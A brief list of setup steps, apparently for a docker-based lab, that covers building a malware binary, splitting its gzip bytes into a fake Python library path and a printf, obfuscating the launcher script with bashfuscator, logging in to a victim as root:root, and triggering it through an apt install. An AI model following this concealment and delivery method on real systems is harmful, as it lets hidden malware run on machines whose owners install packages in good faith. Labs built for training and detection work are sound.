1. copy malware from `../malware/target/release`, after `cargo build -r`
1. gzip compress
1. get all bytes of gzip compression up until the last 10, and store them in `./malware/usr/lib/python3/dist-packages/yarnlib/_`
1. the remaining 10 bytes, place it in the `printf` statement in `malware_script`
1. encode malware script by doing `bashfuscator -f malware_script -s 2 -t 1 --choose-mutators encode/base64 command/reverse compress/gzip -o encoded_malware_script
`
1. `docker compose down && docker compose build && docker compose up`
1. ssh to victim with `root:root`
1. `apt update && apt install cmdtest -y` (make sure `server.py` in `../malware` is running)